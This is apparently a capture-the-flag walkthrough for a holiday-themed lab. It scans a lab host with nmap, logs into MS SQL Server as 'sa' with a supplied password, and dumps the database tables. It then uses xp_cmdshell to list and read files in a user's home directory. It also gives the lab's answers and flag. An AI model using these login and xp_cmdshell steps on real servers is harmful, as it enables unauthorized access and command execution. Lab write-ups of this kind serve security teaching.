# `[Networking]` Where Are the Reindeers?

## Story
>McDatabaseAdmin came rushing into the room and cried to McSkidy, “We’ve been locked out of the reindeer schedule - how will Santa’s transportation work for Christmas?” The grinch has locked McDatabaseAdmin of his system. You need to probe the external surface of the server to see if you get him his access back.

Decided to use the AttackBox for this one as I was on Windows at the time.

### There is an open port related to MS SQL Server accessible over the network. What is the port number? `****`

```
# nmap -sT 10.10.84.3 -Pn
Starting Nmap 7.60 ( https://nmap.org ) at 2021-12-11 21:12 GMT
Nmap scan report for ip-10-10-84-3.eu-west-1.compute.internal (10.10.84.3)
Host is up (0.00082s latency).
Not shown: 996 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
135/tcp  open  msrpc
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

Answer: `1433`

>Let’s try to run, `sqsh -S 10.10.84.3 -U sa -P t7uLKzddQzVjVFJp`

### If the connection is successful, you will get a prompt. What is the prompt that you have received? `**`

Answer: `1>`

>McDatabaseAdmin told us the database name is `reindeer` and it has three tables:
>
>`names`
>`presents`
>`schedule`
>To display the table `names`, you could use the following syntax, `SELECT * FROM table_name WHERE condition`.
>
>`SELECT *` is used to return specific columns (attributes). * refers to all the columns.
>`FROM table_name` to specify the table you want to read from.
>`WHERE condition` to specify the rows (entities).
>In the terminal below, we executed the query, `SELECT * FROM reindeer.dbo.names;`. This SQL query should dump all the contents of the table `names` from the database `reindeer`. Note that the `;` indicates the end of the SQL query, while `go` sends a SQL batch to the database.

```
# sqsh -S 10.10.84.3 -U sa -P "t7uLKzddQzVjVFJp"
1> SELECT * FROM reindeer.dbo.names;
2> go
 id          first                                    last                                     nickname
 ----------- ---------------------------------------- ---------------------------------------- ----------------------------------------
           1 Dasher                                   Dasher                                   Dasher                                  
           2 Dancer                                   Dancer                                   Dancer                                  
           3 Prancer                                  Prancer                                  Prancer                                 
           4 Vixen                                    Vixen                                    Vixen                                   
           5 Comet                                    Comet                                    Comet                                   
           6 Cupid                                    Cupid                                    Cupid                                   
           7 Donner                                   Donder                                   Dunder                                  
           8 Blitzen                                  Blixem                                   Blitzen                                 
           9 Rudolph                                  Reindeer                                 Red Nosed

 (9 rows affected)
```

### We can see four columns in the table displayed above: id, first (name), last (name), and nickname. What is the first name of the reindeer of id 9? `*******`

Answer: `Rudolph`

### Check the table schedule. What is the destination of the trip scheduled on December 7? `******`

```
1> SELECT * FROM reindeer.dbo.schedule;
2> go
```

Answer: `Prague`

### Check the table presents. What is the quantity available for the present “Power Bank”? `*****`

```
1> SELECT * FROM reindeer.dbo.presents;
2> go
```
Answer: `25000`

>Some MS SQL Servers have `xp_cmdshell` enabled. If this is the case, we might have access to something similar to a command prompt.
>
>The command syntax is `xp_cmdshell 'COMMAND';`. Let’s try a simple command, `whoami`, which shows the user running the commands. In the terminal output below, after connecting to MS SQL Server, we tried `xp_cmdshell 'whoami';`, and we can see that the user is `nt service\mssqlserver`.

### There is a flag hidden in the grinch user's home directory. What are its contents? `***{****************}`

```
1> xp_cmdshell 'dir C:\Users\grinch';
2> go

	output 
---                                                                                                                   

	 Volume in drive C has no label.                                                                                          

	 Volume Serial Number is A8A4-C362                                                                                        

	 Directory of C:\Users\grinch   
                                                                                                                                                                          
	11/10/2021  02:22 AM    <DIR>          .                                                                                  
	11/10/2021  02:22 AM    <DIR>          ..                                                                                 
	11/10/2021  02:22 AM    <DIR>          3D Objects                                                                         
	11/10/2021  02:22 AM    <DIR>          Contacts                                                                           
	11/10/2021  02:22 AM    <DIR>          Desktop                                                                            
	11/10/2021  02:29 AM    <DIR>          Documents                                                                          
	11/10/2021  02:22 AM    <DIR>          Downloads                                                                          
	11/10/2021  02:22 AM    <DIR>          Favorites                                                                          
	11/10/2021  02:22 AM    <DIR>          Links                                                                              
	11/10/2021  02:22 AM    <DIR>          Music                                                                              
	11/10/2021  02:22 AM    <DIR>          Pictures                                                                           
	11/10/2021  02:22 AM    <DIR>          Saved Games                                                                        
	11/10/2021  02:22 AM    <DIR>          Searches                                                                           
	11/10/2021  02:22 AM    <DIR>          Videos                                                                             
	               0 File(s)              0 bytes                                                                             
	              14 Dir(s)   4,934,955,008 bytes free                                                                        
	NULL                                                                                                                      

(22 rows affected, return status = 0)
--------------------------------------------------------------------------------
1> xp_cmdshell 'dir C:\Users\grinch\Desktop';
2> go
	output                                                                                                                    
---
	 Volume in drive C has no label.                                                                                          

	 Volume Serial Number is A8A4-C362                                                                                        

	 Directory of C:\Users\grinch\Desktop                                                                                     

	11/10/2021  02:22 AM    <DIR>          .
	11/10/2021  02:22 AM    <DIR>          ..
	06/21/2016  03:36 PM               527 EC2 Feedback.website
	06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
	               2 File(s)          1,081 bytes
	               2 Dir(s)   4,934,930,432 bytes free
	NULL                                                                                                                      

(12 rows affected, return status = 0)
--------------------------------------------------------------------------------
1> xp_cmdshell 'dir C:\Users\grinch\Documents';
2> go

	output                                                                                                                    
---
	 Volume in drive C has no label.                                                                                          

	 Volume Serial Number is A8A4-C362                                                                                        

	 Directory of C:\Users\grinch\Documents                                                                                   

	11/10/2021  02:29 AM    <DIR>          .                                                                                  
    11/10/2021  02:29 AM    <DIR>          ..                                                                                 
    11/10/2021  02:28 AM                21 flag.txt                                                                           
                   1 File(s)             21 bytes                                                                             
                   2 Dir(s)   5,129,494,528 bytes free                                                                                                                          

(11 rows affected, return status = 0)
--------------------------------------------------------------------------------
1> xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';
2> go

	output                                                                                                                    
---

	THM{YjtKeUy2qT3v5dDH}

(1 row affected, return status = 0)

```

Answer: `THM{YjtKeUy2qT3v5dDH}`
